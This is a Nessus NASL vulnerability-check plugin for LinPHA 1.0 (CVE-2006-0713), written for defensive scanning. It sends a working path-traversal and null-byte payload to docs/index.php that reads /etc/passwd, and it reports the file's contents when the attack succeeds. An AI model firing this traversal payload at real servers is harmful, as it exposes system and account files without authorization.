#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20892);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-0713");
  script_bugtraq_id(16592);
  script_osvdb_id(23112, 23113, 23114, 23115, 23116);

  script_name(english:"LinPHA <= 1.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in LinPHA <= 1.0");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LinPHA, a web photo gallery application
written in PHP. 

The installed version of LinPHA suffers from a number of flaws,
several of which could allow an unauthenticated attacker to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

Note that successful exploitation requires that PHP's
'magic_quotes_gpc' setting be disabled, that an attacker has the
ability to create / upload / edit files on the remote host, or that
the application's 'user login events log' setting be enabled." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/linpha_10_local.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424729/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/13");
 script_cvs_date("$Date: 2016/01/08 21:36:07 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/linpha", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "/../../../../../../../../../../etc/passwd";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/docs/index.php?",
      "lang=", file, "%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(\.\./lang/lang\..+/etc/passwd\\0\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '\.\./lang/lang\..+/etc/passwd\\0\.php' for inclusion")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
      contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");

    if (isnull(contents)) security_warning(port);
    else {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
